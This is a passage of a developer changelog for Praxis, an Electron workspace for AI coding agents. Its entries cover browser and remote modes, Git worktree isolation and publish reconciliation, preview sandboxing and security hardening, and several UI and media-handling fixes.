origin wiring, distinct fixed preview ports, and reconnect replay. Verified the
targeted CLI test, full typecheck, browser integration, the complete standard test
matrix (118/118), and a real browser flow that paired, opened the fixture repo,
rendered its proxied preview, and showed the remote indicator. On this workstation
Tailscale is connected; Serve still needs its one-time tailnet activation before a
real second-device HTTPS pass. Multi-client presence, selective revocation, writer
arbitration, and daemon packaging remain tracked as the next mode 2 hardening slice.

## 2026-09-03 — Local browser mode foundation

Added `praxis serve <repo>` as the first executable slice of the browser plan. It
runs the existing Electron main bundle as a windowless local workspace engine,
serves the shared React renderer on IPv4 loopback, and installs an HTTP/WebSocket
`PraxisApi` adapter in place of the preload bridge. Agent, provider, and dev-server
registrations now accept the same small command-router contract as `ipcMain`, so the
working backend and streamed event path are shared rather than reimplemented.

The browser control page uses a single-use launch token exchanged for an `HttpOnly`,
`SameSite=Strict` session cookie. It rejects unexpected Hosts, cross-origin RPC and
WebSocket requests, and commands whose repository path differs from the CLI-selected
real path. Static browser configuration is loaded through a CSP-compatible external
script rather than inline JavaScript.

The project dev server remains private. A separate random-loopback preview gateway
proxies HTTP and HMR WebSocket traffic, strips embedding blockers, injects the small
browser selection bridge, and renders it in a sandboxed iframe. Parent/preview
messages require both the exact preview origin and a per-run token. In a real browser
run, the fixture opened at its live URL and selecting its heading returned
`h1#hero-title` plus `src/components/Hero.tsx:7` to Praxis.

Added `test/browser-mode.mjs` to the Electron tier. It covers the auth exchange and
single-use property, RPC origin and root scoping, agent command/event streaming,
dev-server startup, preview proxying, and bridge injection. Verified `bun run
typecheck`, the targeted browser-mode integration, a real in-app-browser project open
and source selection, and the complete standard `bun run test` matrix (118/118).

## 2026-09-03 — Browser, remote-workstation, and hosted architecture plan

Documented a shared browser-client architecture in `docs/BROWSER.md`. The plan keeps
`PraxisApi` as the renderer contract while separating Electron IPC from a validated
HTTP/WebSocket transport and extracting the preview DOM behavior from its Electron
preload. It covers three workspace locations: same-machine localhost, a local
workstation reached securely from another browser (Tailscale Serve first), and a
fully hosted Railway deployment.

The hosted design deliberately distinguishes a personal single-container alpha from
a multi-user product. The latter requires a stateless control plane, durable metadata
and artifacts, and one isolated worker per untrusted workspace; Railway volumes do
not support replicas and have per-project/count constraints, so a shared volume is
not treated as a multi-tenant sandbox. The plan also records preview-origin isolation,
Git/model credential boundaries, reconnect/recovery requirements, phased delivery,
and the end-to-end definition of done. Documentation-only change; no runtime tests
were needed.

Product priority was then narrowed: build the local-browser and remote-browser/
local-workstation modes first. The personal Railway alpha and multi-user hosted
product remain designed but explicitly deferred, so the first implementation does
not take on cloud orchestration, hosted persistence, or billing concerns.

## 2026-09-02 — Create PR describes git changes instead of pasting chat

PR #8 on `about-me-2026` exposed the failure clearly: Publish used every user
message after a renderer-side counter as release notes, so its title became
`pull latest from main (+15 more)` and its body included arguments, `/clear`, Vite
logs, and Publish's own status text. It also described only the active chat even
when the branch contained work from several chats.

Publish no longer sends chat copy. Main reads the non-merge commits and changed
files against the base branch, filters the legacy transcript-paste commit, and builds
a conventional `Summary` / `Change overview` description with a collapsible diffstat.
Titles use the sole change summary when there is one, or the actual areas touched
(UI components, content, styles, media, tests, dependencies, docs, configuration)
when a PR spans several changes. Reusing an open PR refreshes the bad title/body with
this cumulative git-based description, so another Create PR repairs existing PR #8.

`test/publish-message.mjs` includes a regression shaped like PR #8 and proves chat
noise and the legacy pasted body cannot leak through. Verified with `bun run typecheck`
and the complete `bun run test` suite (118/118).

## 2026-09-02 — Chat color literals have inline previews

Assistant markdown now places a small outlined swatch immediately before CSS hex
colors, including the common inline-code form (for example, `#edf4ff`). Standard
3/4/6/8-digit hex forms are supported. Fenced source blocks and links stay untouched
so code remains clean and URLs are not split. The literal text remains selectable and
copyable; the supplementary swatch is hidden from assistive technology.

`test/markdown-color.mjs` server-renders the real Markdown component to cover every
supported hex form plus the source/link exclusions. `test/chat-render.mjs` checks the
computed swatch color in Electron and captures the result in the existing chat visual
artifact. Verified with `bun run typecheck` and the complete `bun run test` suite
(118/118); the chat screenshot was visually inspected.

## 2026-09-01 — Complex inline text edits run silently in a background agent

Inline text editing still uses the fast direct source splice for plain JSX, Svelte,
and HTML text. The awkward fallback changed: expression/mixed content and write
failures no longer prefill the visible composer and wait for the user to send them.
They now dispatch automatically through the existing isolated background-agent queue,
inheriting the active chat's model/settings and auto-applying through the same safe
worktree landing path as comment agents.

Text-edit spawns carry an explicit origin through renderer → preload → main → terminal
events. That origin keeps their deltas and completion out of the chat transcript: the
rail row is the progress UI and the activity log records success or a review-needed
result. Comment agents retain their existing follow-up note. The generated prompt now
asks for the smallest source edit and forbids changing matching copy elsewhere unless
the selected element truly depends on a shared value, preventing the project-wide copy
expansion shown in the report. Non-repo folders and backends without spawn support
still seed the composer as a lossless fallback instead of dropping the edit.

`test/text-edit.mjs` now drives a real expression fallback through App's preview event,
captures the detached dispatch, and proves both composer and chat remain untouched
through completion. Verified: `bun run typecheck` and the complete standard
`bun run test` matrix (117/117).

## 2026-09-01 — Completed chat branches are pruned even after their checkout is gone

The chat lifecycle already detached and deleted `praxis/chat-*` after a successful
turn, but startup recovery only enumerated directories in Praxis's worktree store. If
an older build or interrupted teardown removed the checkout and failed before deleting
its ref, that branch became invisible to every later cleanup pass and accumulated
indefinitely.

Project open now performs a second, branch-only sweep after orphan recovery. It is
deliberately narrower than a generic Git cleanup: only local `praxis/chat-*` refs are
eligible, never backup/work/comment/remote branches; checked-out branches and persisted
park records are protected; and unique patches are retained. A plain ancestry test is
not sufficient because Praxis commits the private turn and the live landing separately,
with different SHAs. The sweep therefore also uses `git cherry` patch equivalence for
the chat tip, excluding its synthetic WIP-snapshot parent. `test/worktrees.mjs` proves a
different-SHA live commit is recognized while unique, parked, attached, and `backup/*`
branches survive. Verified: `bun run typecheck` and the complete standard
`bun run test` matrix (117/117).

## 2026-09-01 — Animation controls are contextual and animation generation is opt-in

The Styles tab used to render its Transition group for every element because
computed CSS always reports the browser defaults (`transition-property: all`,
`transition-duration: 0s`, `transition-timing-function: ease`). Those values look
configured but cannot animate anything. The panel now treats a transition as active
only when its property list is not entirely `none` and at least one computed duration
is positive. Inactive elements show no property/duration/delay/easing/Replay controls;
a genuinely transitioned element still gets the complete editor.

The empty state is a separate **Generate animation controls** action. It asks for an
optional animation description, then sends a dedicated agent turn that first follows
the project's existing CSS/Tailwind/Motion idiom, respects reduced motion, and then
surfaces the useful duration/easing/spring/distance/stagger parameters through the
existing Dialkit-style custom-control seam. This is deliberately different from the
generic “Surface controls” prompt, whose instrumentation step promises not to change
runtime behavior.

Also evaluated the published `interface-kit@0.1.3` package without adding it to the
repo. It has broader built-in styling coverage (width/height, alignment, borders,
shadows, backdrop blur) and polished scrub controls, but it requires React 19 while
Praxis is on React 18, ships roughly 1.2 MB unpacked, declares itself as a dependency,
and its edit model applies temporary DOM styles then copies a heuristic selector-based
prompt. Praxis already resolves stamped source, writes through Tailwind/inline/agent
paths, supports tokens/props/custom controls, undo, and multiple frameworks. Decision:
do not adopt the package; borrow interaction/property-coverage ideas selectively.

Verified: `bun test/css-values.mjs` (143 assertions), `bun run typecheck`, production
build, and the real Electron `test/style-edit.mjs` flow with an isolated profile. Read
both island captures: the default element has no Transition group; the active
transition restores the full Bezier editor and Replay controls. The full standard
matrix was 116/117 on its first run: only the unrelated `spawn-comment` branch-cleanup
assertion failed, then passed immediately when rerun alone (deterministic + live paths).

## 2026-08-28 — Codex can operate Praxis-owned worktree recovery

The in-app Codex was told not to mutate Praxis's `praxis/chat-*` branches, but the only
supported resolver lived behind a renderer button. When it recognized an authoritative
landing conflict it could inspect its private checkout, yet could neither see the
coordinator's parked state nor ask Praxis to stage both sides; the resulting “Praxis
should resolve this” answer sent the user to a second Codex session in a terminal.

Codex and custom-gateway sessions now receive a small Praxis MCP server with two tools:
`workspace_state` reads the chat's authoritative isolated/parked/resolving state, and
`prepare_conflict_resolution` runs the existing three-way resolver through the
repository-scoped writer queue. Marker-bearing files are left in the same worktree the
model already edits, so Codex reconciles both versions and ordinary turn completion
lands the result. A second prepare call is idempotent. Preparation refuses to reset a
worktree if the current turn already changed it, preserving those edits for the next
cumulative attempt.

The MCP subprocess never receives a raw Git primitive or direct access to coordinator
internals. Each chat gets an unguessable bearer token over a user-only local socket;
main maps that token to exactly one live session and removes it on teardown. Destructive
discard/reset operations remain UI/user decisions. Praxis rules v12 now direct Codex to
use the tools before offering terminal instructions. `test/praxis-agent-tools.mjs`
drives the actual MCP protocol under Electron-as-Node and proves token isolation plus
both calls; the existing worktree and rule suites cover resolver safety and prompting.
Verified: `bun run typecheck`, production build, and the complete `bun run verify`
matrix pass (123/123), including a real Codex turn with the injected MCP configuration.

## 2026-08-27 — Publish reconciles a moved remote branch without rewriting history

A reused work branch could diverge from `origin/praxis/*`: Publish committed the
local work and immediately pushed, so Git rejected it even though both histories
were valid. The concrete report was `about-me`'s `praxis/main`, where the remote
tip had been rewritten independently and Praxis had continued committing locally.

`src/main/publish-reconcile.ts` now owns the shared-branch landing step. One publish
holds a canonical-path, per-repository lock across commit, reconciliation, PR, merge,
and cleanup. Before every push it fetches/prunes origin and writes local recovery refs
for the current local and remote tips. An ancestor remote pushes normally; an ancestor
local fast-forwards; diverged histories get an explicit `--no-ff` merge. No path uses
force, rebase, reset, or a global ours/theirs choice. If the remote moves after fetch,
the rejected push triggers at most two more fetch/reconcile attempts.

Overlapping content pauses Publish with Git's merge state intact. `PublishResult`
carries the exact conflict files and recovery refs, and the publish log opens with a
per-file resolution checklist instead of only the raw Git error. A second Publish
cannot accidentally stage conflict markers: existing unmerged paths are detected
before `git add -A`.

`test/publish-reconcile.mjs` uses real bare repositories and peer clones to cover a
missing branch, local ahead, local behind, clean divergence, content conflict, a
remote that advances from a `pre-push` race, and lock release. The longer-term removal
of permanent shared work branches remains tracked in TASKS: publish unique
`praxis/publish/<session-id>` branches from fresh `origin/<base>` snapshots. Verified:
`bun run typecheck` and the complete `bun run test` suite (117/117) pass.

## 2026-08-24 — Closing the launch terminal no longer causes endless error dialogs

Stopping a development launch could close its PTY while Electron was still winding
down. The next `console` write then emitted `EIO` (or `EPIPE` on other Unix systems)
as an uncaught exception. Praxis's global exception backstop tried to log that error
to the same dead stream, creating another `EIO` and another native error dialog in an
unbounded loop.

`src/main/terminal-streams.ts` now installs narrow error guards on stdout and stderr:
write-side `EIO`/`EPIPE` from a vanished terminal are absorbed, while every other
stream failure is rethrown for the existing crash reporter. The guards are installed
before main-process startup work. `test/terminal-streams.mjs` covers macOS `EIO`,
Unix `EPIPE`, and proves unrelated write/read errors still surface. Verified:
`bun run typecheck`, the complete 58-test unit tier, and an isolated Electron smoke
launch all pass.

## 2026-08-18 — Cross-origin iframes can navigate without escaping the preview

Electron 43 reports both `will-navigate` and `will-redirect` through an event-details
object, and redirects can belong to subframes. The preview guard still read the
deprecated positional URL and applied the pinned-origin policy to every redirect, so
a cross-origin iframe's 302 was cancelled and handed to `shell.openExternal`. The
guard now reads `details.url` / `details.isMainFrame`: subframe navigation and
redirects proceed untouched, while main-frame navigation remains pinned to the exact
loaded origin (including port) and safe HTTP/HTTPS/mailto escapes are externalized.

Popup creation is kept separate from frame navigation. Electron's
`setWindowOpenHandler` details do not expose a trustworthy user-activation signal, so
the preview denies popup requests silently instead of externalizing automatic
`window.open` calls during iframe initialization. A new Electron regression runs a
static preview and iframe server on separate local origins, follows a real 302 to
render content in the child frame, spies on `shell.openExternal`, and then proves a
top-level attempt to navigate to the iframe server's different localhost port is
still blocked/externalized. Verified: `bun run typecheck:node`, `bun run build`, and
`test/preview-iframe-navigation.mjs` pass. The new test and package manifest pass
Biome; the repo-wide `bun run lint` still reports the existing baseline diagnostics
in unrelated and previously nonconforming files.

## 2026-08-14 — Architecture + security review, and the fixes it produced

A full review of the codebase (architecture and security, two independent
passes) found no confirmed exploit — the core boundaries held up: the preview
preload exposes nothing to the untrusted page (no contextBridge), preview→main
relays validate `e.sender`, secrets never leave main, every renderer/agent path
is re-validated. What it did find became twelve fixes, all landed on this
branch (PR #217):

**Security hardening.** The untrusted preview view now runs on its own
`persist:praxis-preview` session partition with deny-all
`setPermissionRequestHandler`/`setPermissionCheckHandler` — previewed content
could previously request geolocation/notifications/clipboard under Electron
defaults, and shared permission grants/service workers/cache with the trusted
windows. Navigation policy tightened twice: `will-redirect` now shares the
`will-navigate` guard (3xx redirects bypassed it), and the allowed target is
the SAME ORIGIN main last loaded, not "any localhost port" — an untrusted page
can no longer steer the preview (preload attached) onto a sibling local
service. One behavior change with teeth: a dev server answering a cross-origin
redirect now opens externally instead of being followed. The two `shell:true`
spawn sites (devserver, simulator) carry their invariant in a comment now:
command strings come from framework detection or the user, never file/page
content.

**The real bug: background chats' permission cards were dead.** Permission/
question cards were pooled globally in the renderer and rendered into whichever
chat was on screen, while main resolved responses only against
`activeSession()` — so a backgrounded turn's card appeared under the wrong
chat and its Allow/Deny silently no-oped (`resolvePending` on the wrong
session), wedging the tool call. Now: `PermissionRequest`/`QuestionRequest`
carry `sessionKey`, ChatPanel filters to its own chat, and main scans every
live session's pending maps. The blanket `clearPending()` on switch is gone —
per-id resolved events from `closeSession` already handle real teardown.

**Drift-proofing the mirrors.** Three hand-maintained cross-boundary copies
became single sources: `LayerNode`/`LayersSnapshot`/`LayerFingerprint` (preview
redeclared them) now import from `shared/api.ts`; the ~20 preview IPC channel
names live once in `shared/preview-channels.ts`; the Styles-panel property
allowlist is `shared/style-props.ts`, with the renderer's `STYLE_PROP_META`
`satisfies`-checked against it so a one-sided addition fails typecheck. Two
already-drifted preload types got named and fixed (`SimElementPick` had lost
`source: string | null`; `ProjectCreateResult` had lost `warning?`).

**Lifecycle + size.** `nativeTheme.on('updated')` moved out of
`createWindow()` (it leaked a listener per macOS dock re-activate) into
`whenReady`. The spawn cap could be overshot by concurrent `pumpQueue` racers
passing the check before any registration landed — a `startingCounts`
reservation taken synchronously (before `startSpawn`'s first await) closes it.
`registerPreviewIpc` (~400 lines) left `index.ts` for `preview-ipc.ts`
(1263 → 968), collapsing the twin style-read/layers-read pending-maps into one
`requestReply` helper; preload's 24 copies of the subscribe/unsubscribe wrapper
became an `on<T>()` factory (507 → 429). New `test/style-tokens.mjs` covers the
pure token re-resolution (it re-validates island-supplied picks — security-
relevant, previously only exercised transitively via `style-edit`); unblocking
it required `tokens.ts` to import electron as a namespace, since the named
`ipcMain` import fails to link under plain bun.

Deliberately deferred (each deserves its own PR): splitting `App.tsx` (2194),
`store.ts` (1755), `ChatPanel.tsx` (1704), and extracting `props.ts`'s shared
source-file plumbing into a `source.ts`. Verified per commit:
`bun run typecheck` clean, unit tier green (sandbox skips `devserver-net` —
it can't bind sockets), electron tier under `xvfb-run` 55/56 with the one
failure (`editor-search`) reproduced at the base commit, so pre-existing.
## 2026-08-18 — Last-used / Settings default model, and Main that survives reload

User request: the picker always fell back to Claude, and Main came back empty
after a relaunch (the previous thread sitting in History as a different row).

**Default model.** New chats with no stored settings used to call
`defaultChatAgentSettings()` (Claude, always). That's now a fallback behind
`preferred-model.ts`: the product default is **last used** — whichever model
the user last picked in any chat, persisted in `praxis:preferred-model` next
to the workspace snapshot. Settings → Models & Providers has a "Default model"
select: Last used, or a specific model from the live catalog. A pinned pick
does not forget last-used, so flipping back is instant. Existing chats still
own their `chatSettings`; this only fills in a chat that has none (first
project of a session, a Main that was never configured).

**Main persistence.** `closeSession` used to write every torn-down thread into
History, and a relaunch started a blank Main then `resumeMostRecent`'d that
record as a *secondary* chat. Main is now a slot: quit/close/`open-project`
replacement saves `slot: 'main'` (and replaces any previous Main file);
`sessions:list` / the rail History section omit it; the next `open-project`
seeds the live record from that slot and, when a Claude `sdkSessionId` is
present, resumes the SDK session under the same `projectKey`. Codex/gateway
still can't resume the provider thread (see `docs/PROVIDERS.md`) but the
transcript is back on Main instead of lost. **Project memory → Clear context**
archives without `slot` so the conversation becomes a normal previous agent,
then starts a fresh Main. Model-switch restart seeds the replacement record
instead of dumping the thread into History.

`test/preferred-model.mjs` (unit) covers last-used vs fixed resolve;
`test/sessions-store.mjs` covers the Main slot + prune exemption;
`test/agent-history.mjs` and `test/restore-reload.mjs` close/reopen Main
through real IPC.

## 2026-08-12 — A project's own favicon leads its rail row

User request: a project with a favicon should show it in the sidebar instead of
the generic folder icon. New `src/main/project-icon.ts` resolves one from the
project's SOURCE TREE and inlines it as a `data:` URL; `project:icon` IPC + a
`useProjectIcons` store (its own file — `store.ts` is long past the ~500-line
convention) feed `Rail.tsx`, where the `<img>` rides the existing
`.rail__folder` class so it inherits the same 16px slot and the same
hover-to-chevron cross-fade. Projects without one are unchanged.

Resolution order: a declared `<link rel="icon">` in an HTML entry wins (it's
what the project itself says its icon is), then the conventional paths —
dir-major, `src/app`/`app` ahead of `public` because Next's app router serves
`app/favicon.ico` in preference, and svg ahead of png ahead of ico within a
dir. A dangling declaration falls THROUGH to the conventions rather than
leaving the project iconless.

Why files and not the preview: `page-favicon-updated` would only ever cover the
project whose dev server is up, and the rail lists every open project — most of
them cold. Scanning the checkout is the only source that covers the whole list.

Three things worth keeping in mind here. (1) The HTML is project content, so a
declared href is untrusted input: `../../secret.png` is refused by a
`withinRoot` check rather than joined blindly. (2) Icons are capped at 512 KB
and an oversized candidate is SKIPPED (the next one wins) rather than
disqualifying the project — a 3 MB `icon.png` shouldn't cost a folder glyph.
(3) Main caches per root and revalidates by the source file's mtime+size, so
editing a favicon in place updates the rail; the renderer caches misses for the
session, so ADDING a first favicon to an open project shows on next launch.
Noted in `project-icons.ts` — a `refresh()` is the fix if it ever bites.

**The Electron tier runs with no display at all.** The 2026-08-07 correction
established that the tier works when driven through `test/run.mjs` (which
isolates `PRAXIS_USER_DATA`); this adds the other half — it doesn't need a real
desktop either. Under `xvfb-run -a`, `test/rail.mjs` passes and the new
`test/rail-favicon.mjs` drove two real projects and screenshotted the result
(`test/artifacts/19-rail-favicon.png` — magenta favicon on one row, grey folder
on the next). Recipe: `electron-vite build`, then
`PRAXIS_USER_DATA=$(mktemp -d) xvfb-run -a node test/<name>.mjs`. Both halves
matter — dropping `PRAXIS_USER_DATA` reintroduces the `.empty__open` timeout
(2026-08-04 hazard note), and dropping `xvfb-run` gives no window. "Needs a
display" is no longer a reason to leave an electron-tier assertion unrun.

`test/project-icon.mjs` (unit) covers the pure rules plus an end-to-end pick
over real temp trees; `test/rail-favicon.mjs` (electron) proves the glyph swap,
including `naturalWidth > 0` so a broken data URL can't pass as a rendered
icon. `selectable-app` gained a deliberately loud `public/favicon.svg` so the
screenshot is readable by a human.

## 2026-08-09 — One indent grid for the rail, and actions that stop reserving space

Yesterday's re-sort put the rail's controls in the right places but left them on four
different vertical lines. Everything inside a project's block now shares one grid: an
8px pad, a 16px glyph slot, a 7px gap, labels at 31px. The folder icon and the chat
status dots were already there; "New chat" was inset a further 6px by its own margin
(its + landed 5px right of the dot column, its label at 35px), and the History fold
chevron sat in a 12px slot at 15px. Both now sit in the same 16px slot — the + as a
14px glyph with 1px side margins, the chevron as a 12px one with 2px, and the chevron's
5px right margin absorbs the difference between the label's 4px gap and the grid's 7px
so the heading text still lands at 31px. `test/rail-chat-status.mjs` asserts the whole
grid now (every dot, the +, the chevron; every chat name, the New-chat label, both
section headings) rather than just the dots and the chat names.

The other misalignment was on the right. A chat row's rename pencil and close × were
flex children, so they SHORTENED the model/time slot of exactly the rows that have
them — which is why Main, the one row with neither, pushed its model label ~34px
further right than every sibling, and why every other row carried a permanent empty
gutter. They're now an absolutely-positioned overlay: every row's meta ends on the same
trailing edge, and on hover the meta fades out underneath the buttons instead of the
row reserving space for them. The overlay is `pointer-events: none` while hidden so an
invisible × can't eat a click meant for the row; the parent hover arms it before it's
reachable, and `:focus-within` keeps it usable from the keyboard. A model label (≤66px)
is wider than the two buttons, so they land entirely inside it; a history row's "3h"
isn't, so those rows give the name 24px of hover padding to re-ellipsise before the
buttons rather than run under them.

Two defaults flipped with it. History now starts FOLDED (`historyOpened`, the inverse
of yesterday's `historyClosed`): the live chats are the actionable list, and past chats
otherwise push every sibling project down the rail. And the project-memory brain became
hover-revealed like × — yesterday's reasoning was that an always-on brain next to a
hover-only × read as two controls of unequal weight, and the same argument works the
other way round, with the row at rest reduced to just its folder and name.

`src/renderer/src/components/Rail.tsx`, `src/renderer/src/components/RailChatRow.tsx`,
`src/renderer/src/styles.css`, `test/rail-chat-status.mjs`,
`test/rail-chat-overflow.mjs`, `test/history-ui.mjs`.
## 2026-08-09 — The editor shows media instead of decoding it

Clicking `public/images/team/arkady.PNG` in the pop-out editor's file tree used to
`readFile(…, 'utf8')` it and pour the result into CodeMirror: thousands of lines of
mojibake with a line-number gutter down the side. `source:read` now classifies the
file first. Images/video/audio come back as `media` (an empty `code` plus a
`praxis-media://` URL) and every other non-text file as `binary`; the drawer swaps
CodeMirror for `MediaPreview` — the picture on a transparency checkerboard, a
`<video>`/`<audio>` with controls, or a plain placeholder — with a footer reading
`96 × 96 · 301 B · image/png` and a Fit/1:1 toggle. Save disappears (there is nothing
to save), the header drops the meaningless `:1`, and `source:write` refuses these
files outright so no future caller can utf8 round-trip a PNG into corruption.

Why a custom protocol rather than the `data:` URL the composer's attachments use: a
video has to be RANGE-servable or Chromium can't seek it, and base64ing one through
IPC to sit in the renderer's heap is exactly the wrong shape. `file://` was the other
option and it hands the renderer a read primitive for the whole disk. So main
registers `praxis-media://` (privileged: standard + secure + stream + fetch) and
serves an opaque per-file TOKEN — the renderer never names a path, so the scheme
can't be widened into an arbitrary-file read even from a compromised renderer.
Responses stream from `createReadStream`, honour `Range` (206 + `Content-Range`, 416
when unsatisfiable) and carry `no-store`, since the token is a hash of the path and
a stale cached copy would outlive an edit. The renderer's CSP gained
`img-src … praxis-media:` and a `media-src` (it had none — `<video>` was falling back
to `default-src 'self'`); `connect-src` was deliberately NOT widened, which is why the
protocol test drives `net.fetch` from main.

Detection is by extension and case-insensitive — the reported file was `.PNG`, and
`extname().toLowerCase()` is the whole fix for a class of asset that ships uppercase.
`.svg` is deliberately absent from the media table: it's markup the user edits, so it
stays text. The binary fallback is a NUL/U+FFFD sniff on the decoded content, which
also catches the fonts and archives that were garbling the same way.

`src/main/media.ts`, `src/main/media-types.ts`, `src/main/props.ts`,
`src/main/index.ts`, `src/shared/api.ts`, `src/renderer/index.html`,
`src/renderer/src/components/MediaPreview.tsx`,
`src/renderer/src/components/CodeDrawer.tsx`, `test/media-types.mjs`,
`test/code-drawer.mjs` (+ a 301-byte `Logo.PNG` fixture, uppercase on purpose).

## 2026-08-09 — The rail's per-project controls sort themselves out

Each rail section now sits where its meaning is. Project memory was a full-width row
buried under the chat list even though it is a property of the PROJECT, so it moved up
onto the project row as an always-visible brain action next to ×; × in turn became
hover-only, since two equally loud controls a few pixels apart made the destructive one
too easy to hit. "New chat" made the opposite trip: it was a header glyph that only
appeared for the active project, and it is now a full-width button directly under the
chat list it appends to — visible for every expanded project (`newChatForProject`
already handled a backgrounded one by adding the session without stealing the screen).

History became an accordion. Its heading folds the whole section away — open by
default, session-only state per project, the same shape as "Show N more", which still
caps the open list at three rows. A project with a long history can now be quiet
without being collapsed entirely.

The brain's `aria-label` deliberately reads "Open project memory for X", not
"X's project memory": the memory dialog's textarea is found by
`[aria-label$="project memory"]`, and a suffix collision would have made the rail
button answer to the dialog's selector.

`src/renderer/src/components/Rail.tsx`, `src/renderer/src/styles.css`,
`test/rail-chat-overflow.mjs`.

## 2026-08-08 — Main is stable; child agents have parents; decisions outlive context

The project rail now describes the actual ownership tree instead of flattening live
chats, comment spawns, and history together. Main is pinned first and non-closeable;
secondary chats keep their generated names; background comment agents nest beneath the
exact session that launched them and show the inherited model; Project memory and
History are explicit separate sections. Main/child working state aggregates up to the
project row. The rail grew from 168px to 208px so these identities remain readable.

Spawn routing now carries the parent `sessionKey` end-to-end rather than filing every
worker under the bare project key. The selected chat's provider/model/connection still
flows into the spawn; Claude remains the only backend declaring detached-spawn support,
so unsupported backends now explain the fallback into the active chat instead of doing
it invisibly.

Durable project memory lives under Praxis userData, never inside the repo or `.praxis/`,
and is capped at 16k characters. Every provider receives it in initial instructions;
an edited revision reaches an already-live chat once on its next turn. Clearing Main
saves the visible memory, archives the old transcript, restarts the same stable Main key
with the same model/posture, and leaves files, secondary chats, and memory untouched.

`src/main/project-memory.ts`, `src/main/agent.ts`, `src/main/rules.ts`,
`src/renderer/src/components/Rail.tsx`, `src/renderer/src/components/ProjectMemoryDialog.tsx`,
`test/project-memory.mjs`, `test/project-memory-ui.mjs`, `test/rail-chat-status.mjs`.

## 2026-08-08 — Failed turns park once; only successful turns publish

The old turn hook treated `done` and `error` identically: both auto-landed whatever was
in the worktree. That made a provider crash or forced interruption publish partial code.
It also assumed one terminal event, but Codex deliberately reports a failure as `error`
and then closes the stream with `done`; Praxis finalized that one turn twice.

`TurnTerminalTracker` now claims exactly one outcome after each `agent:send`. A clean
`done` is `success`; the first `error` is `failed`, and any later terminal event for that
turn is ignored. Successful work follows the normal repository landing queue. Failed or
interrupted work is squashed durably onto its attached chat branch and parked without a
single live write. A failure with no edits simply detaches and removes its empty branch.

The real isolation regression drives a failed terminal through `afterTurn`, confirms the
partial file exists on `praxis/chat-*` while live HEAD and the working tree stay clean,
then discards it and confirms the branch is deleted. The pure tracker test pins Codex's
`error→done`, duplicate `done`, and Claude's error-only shape.

This pass also adds `docs/WORKTREES.md` (state machine, invariants, recovery/limits) and
`docs/PROVIDERS.md` (the actual Claude/Codex/gateway/Gemini capability matrix), correcting
README's backend-agnostic instruction/tool claims.

`src/main/turn-terminal.ts`, `src/main/agent.ts`, `src/main/chat-isolation.ts`,
`src/main/chat-worktrees.ts`, `test/turn-terminal.mjs`, `test/live-commit.mjs`.

## 2026-08-08 — Conflict resolution no longer borrows the user's Git index

Issues #203, #210 and #211 all showed the same family of failure: `.env` or generated
typecheck/dependency artifacts entered a chat patch, then `git apply --3way` consulted
the live checkout's real index and refused with `does not match index`. That index is
allowed to differ — it may contain the user's own staged work — so it was never a sound
resolver dependency.

The 3-way fallback now snapshots the current working tree, seeds a temporary index from
that synthetic commit, refreshes its stat data, and applies through it. The user's real
index is neither read nor mutated. A regression stages one version of a file, leaves a
different version in the working tree, and proves the chat's non-overlapping edit merges
while the staged blob stays byte-for-byte unchanged.

Snapshots, chat commits and live commits now share an explicit exclusion policy:
`.env`/non-template `.env.*`, any `node_modules`, `*.tsbuildinfo`, and Praxis's current
or legacy sidecars cannot enter a synthetic base or landing. `.env.example`/sample/
template/defaults remain normal product files. Runtime dependency/env symlinks are only
created when Git confirms the path is ignored, closing #203's committed `.env` symlink
path. Snapshot failure now fails the isolated chat open instead of quietly forking from
stale HEAD and later manufacturing conflicts.

Finally, a committed resolution that still contains complete Git marker triplets remains
parked; it can no longer be auto-written into the live project. `test/chat-worktrees.mjs`
now covers all three regressions with real temporary repositories.

`src/main/worktrees.ts`, `src/main/chat-worktrees.ts`, `src/main/live-commit.ts`,
`src/main/chat-isolation.ts`, `test/chat-worktrees.mjs`, `test/live-commit.mjs`.

## 2026-08-08 — Concurrent chats share one landing queue, not one racing Git index

Git worktrees isolated where models EDITED, but each chat had its own finalization
promise and all of those promises converged on the same live checkout/index. Two chats
finishing together could both run `git add`/`git commit` there; `commitLiveTurn` treats
Git failures as best-effort, so one commit could disappear while its file write remained
uncommitted. A real two-chat regression now lands both edits as two commits and leaves a
clean live index.

`src/main/repo-write-queue.ts` is the missing repository-level coordinator. Worktree
creation/snapshots, turn landing, parked apply/discard/resolve, and final teardown all
pass through it. Per-chat chains still order one conversation's turns; the repo queue
orders every writer that ultimately targets the one shared checkout.

Chat branches are now recovery refs, not permanent session furniture. An idle chat keeps
its linked worktree detached with no `praxis/chat-*` branch. `beforeTurn` recreates and
attaches the branch before the model can edit, so a crash or conflict still has a durable
ref. A successful landing (including clean resolution and discard) detaches the worktree
and deletes the branch immediately. Parked work alone retains its branch. The next turn
recreates the same name, so long-lived projects no longer accumulate one stale branch per
chat.

`src/main/repo-write-queue.ts`, `src/main/worktrees.ts`,
`src/main/chat-worktrees.ts`, `src/main/chat-isolation.ts`,
`test/live-commit.mjs`, `test/chat-isolation.mjs`.
## 2026-08-08 — A conflict on almost every turn: the node_modules symlink

**Symptom (user-reported):** the "These changes couldn't be merged automatically"
card appeared on nearly every chat turn, listing `node_modules` next to the file
the chat actually edited (`components/arkane-experience.tsx`).

**Cause.** Per-chat isolation symlinks `node_modules`/`.env` into every worktree
(`worktrees.ts` `doCreateWorktree`) and trusted the target repo's `.gitignore` to
keep them out of commits. But a `.gitignore` pattern with a *trailing slash*
(`node_modules/`, the Next.js/CRA/Vite default) is **directory-only** and git
never classifies a symlink as a directory — so the pattern doesn't match the
symlink. `commitWorktree`'s `git add -A` then staged it, and the turn-end
auto-merge (`autoApplyWorktree`) did `readFile(worktree/node_modules)` on a
symlink-to-a-directory → `EISDIR` → the code treats any read failure as "refuse
the whole batch" → the turn **parked** every time. The real edit rode along in
the parked file list but was never the problem. `.env` didn't leak only because
its rule (`.env`, no slash) *does* match the symlink — that asymmetry was the
fingerprint.

**Fix (all Praxis-side, so it holds for any repo regardless of its `.gitignore`).**
A new `RUNTIME_DEPS = ['node_modules', '.env']` export in `worktrees.ts` is now
excluded explicitly at every stage: `captureBase` and `commitWorktree` unstage it
after `git add -A` (mirroring the existing `.praxis` unstage), and
`chat-worktrees.ts`'s three `git clean -fd` sites gained `-e node_modules -e .env`
(via a `cleanArgs()` helper) so the now-untracked symlinks survive resets and the
worktree keeps building. `scaffold.ts` also ships new projects with a fuller,
deliberately **slash-free** `.gitignore`.

**Tests.** `test/chat-worktrees.mjs` gains a repo9 regression: a `node_modules/`
(trailing-slash) `.gitignore` must still merge a turn cleanly with `node_modules`
